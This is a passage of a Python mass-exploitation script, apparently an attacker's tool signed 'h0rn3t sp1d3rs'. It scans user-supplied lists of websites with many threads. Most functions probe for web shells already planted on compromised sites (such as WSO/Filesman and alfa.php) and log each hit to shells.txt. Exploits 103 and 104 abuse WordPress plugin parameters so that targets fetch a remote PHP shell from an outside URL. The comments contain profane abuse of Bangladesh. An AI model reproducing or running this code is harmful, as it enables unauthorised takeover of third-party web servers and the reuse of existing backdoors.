        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_82(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/backups-dup-lite/dup-installer/main.installer.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 82 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/backups-dup-lite/dup-installer/main.installer.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/backups-dup-lite/dup-installer/main.installer.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 82 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/backups-dup-lite/dup-installer/main.installer.php\n')
            else:
                print ('[#] Exploit 82 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#82 exploit already done
#fuck you Bangladesh 
#fuck you Bangladesh system 
#call me h0rn3t sp1d3rs 

def exploit_83(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/606.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 83 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/606.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/606.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 83 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/606.php\n')
            else:
                print ('[#] Exploit 83 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_84(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 84 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 84 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/404.php\n')
            else:
                print ('[#] Exploit 84 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#call me h0rn3t sp1d3rs 
#complete 

def exploit_85(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/bp.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 85 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cgi-bin/bp.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 85 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cgi-bin/bp.php\n')
            else:
                print ('[#] Exploit 85 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#

def exploit_86(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/403.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 86 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cgi-bin/403.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/403.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 86 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cgi-bin/403.php\n')
            else:
                print ('[#] Exploit 86 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_87(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/403.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 87 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/403.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/403.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 87 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/403.php\n')
            else:
                print ('[#] Exploit 87 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_88(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wordpress/241.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 88 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wordpress/241.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wordpress/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 88 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wordpress/241.php\n')
            else:
                print ('[#] Exploit 88 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_89(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/pridmag/24.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 89 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/24.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/pridmag/24.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 89 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/24.php\n')
            else:
                print ('[#] Exploit 89 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_90(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/241.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 90 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/241.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 90 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/241.php\n')
            else:
                print ('[#] Exploit 90 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_91(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/24.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 91 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/24.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/24.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 91 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/24.php\n')
            else:
                print ('[#] Exploit 91 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_92(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/241.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 92 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/241.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 92 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/241.php\n')
            else:
                print ('[#] Exploit 92 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_93(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/406',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 93 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/406\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/406',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 93 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/406\n')
            else:
                print ('[#] Exploit 93 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_94(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 94 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/1.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 94 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/1.php\n')
            else:
                print ('[#] Exploit 94 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_95(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/x.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 95 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/x.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 95 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/x.php\n')
            else:
                print ('[#] Exploit 95 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_96(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/c.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 96 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/c.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/c.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 96 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/c.php\n')
            else:
                print ('[#] Exploit 96 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_97(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/z.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 97 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/z.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/z.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 97 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/z.php\n')
            else:
                print ('[#] Exploit 97 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_98(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/bp.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 98 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/bp.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 98 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/bp.php\n')
            else:
                print ('[#] Exploit 98 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_99(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/alfa.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 99 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/alfa.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/alfa.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 99 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/alfa.php\n')
            else:
                print ('[#] Exploit 99 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_100(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 100 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wso.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 100 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wso.php\n')
            else:
                print ('[#] Exploit 100 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_101(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 101 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 101 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/404.php\n')
            else:
                print ('[#] Exploit 101 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_102(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/mu-plugins/s.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 102 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/s.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/mu-plugins/s.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 102 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/s.php\n')
            else:
                print ('[#] Exploit 102 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_103(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
        if ('mini shell by h0rn3t sp1d3rs ' in check.content.decode("utf-8")):
                print (' [#] Exploit 103 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8"):
                    print (' [#] Exploit 103 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
            else:
                print ('[#] Exploit 103 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_104(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
        if ('mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8")):
                print (' [#] Exploit 104 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'mini shell by h0rn3t sp1d3rs ' in check.content.decode("utf-8"):
                    print (' [#] Exploit 104 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
            else:
                print ('[#] Exploit 104 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_105(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/beauty-premium/includes/shell.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 105 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/beauty-premium/includes/shell.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/beauty-premium/includes/shell.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 105 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/beauty-premium/includes/shell.php\n')
            else:
                print ('[#] Exploit 105 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#




#funtion pool ha ha
def run_code(site):
    try:
        
        exploit_1(site)
        exploit_2(site)
        exploit_3(site) 
        exploit_4(site)
        exploit_5(site)
        exploit_6(site)
        exploit_7(site)
        exploit_8(site)
        exploit_9(site) 
        exploit_11(site)
        exploit_12(site)
        exploit_13(site)
        exploit_14(site)
        exploit_15(site)
        exploit_16(site)
        exploit_17(site)
        exploit_18(site)
        exploit_19(site)
        exploit_20(site)
        exploit_21(site)
        exploit_22(site)
        exploit_23(site)
        exploit_24(site)
        exploit_25(site)
        exploit_26(site)
        exploit_27(site)
        exploit_28(site)
        exploit_29(site)
        exploit_30(site)
        exploit_31(site)
        exploit_32(site)
        exploit_33(site)
        exploit_34(site)
        exploit_35(site)
        exploit_36(site)
        exploit_37(site)
        exploit_38(site)
        exploit_39(site)
        exploit_40(site)
        exploit_41(site)
        exploit_42(site)
        exploit_43(site)
        exploit_44(site)
        exploit_45(site)
        exploit_46(site)
        exploit_47(site)
        exploit_48(site)
        exploit_49(site)
        exploit_50(site)
        exploit_51(site)
        exploit_52(site)
        exploit_53(site)
        exploit_54(site)
        exploit_55(site)
        exploit_56(site)
        exploit_57(site)
        exploit_58(site)
        exploit_59(site)
        exploit_60(site)
        exploit_61(site)
        exploit_62(site)
        exploit_63(site)
        exploit_64(site)
        exploit_65(site)
        exploit_66(site)
        exploit_67(site)
        exploit_68(site)
        exploit_69(site)
        exploit_70(site)
        exploit_71(site)
        exploit_72(site)
        exploit_73(site)
        exploit_74(site)
        exploit_75(site)
        exploit_76(site)
        exploit_77(site)
        exploit_78(site)
        exploit_79(site)
        exploit_80(site)
        exploit_81(site)
        exploit_82(site)
        exploit_83(site)
        exploit_84(site)
        exploit_85(site)
        exploit_86(site)
        exploit_87(site)
        exploit_88(site)
        exploit_89(site)
        exploit_90(site)
        exploit_91(site)
        exploit_92(site)
        exploit_93(site)
        exploit_94(site)
        exploit_95(site)
        exploit_96(site)
        exploit_97(site)
        exploit_98(site)
        exploit_99(site)
        exploit_100(site)
        exploit_101(site)
        exploit_102(site)
        exploit_103(site)
        exploit_104(site)
        exploit_105(site)
        
        
    except:
        pass


# #
# #call me h0rn3t sp1d3rs 
# mp = Pool(poolAmount)

# # call the function 
# mp.map(run_code, target)
 

# mp.close()
# mp.join()
filename = input("\033[1;31mENTER FILE NAME: ")
# file = open(filename).read().split()
file = open(filename, encoding="utf-8").read().split()

myfile = set(file)
thread = int(input("\033[1;31mThreads: "))

# Create a thread pool with a maximum of 10 threads
with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
    # Submit each URL to the thread pool
    futures = [executor.submit(run_code, site) for site in myfile]

    # Wait for all threads to complete
    concurrent.futures.wait(futures)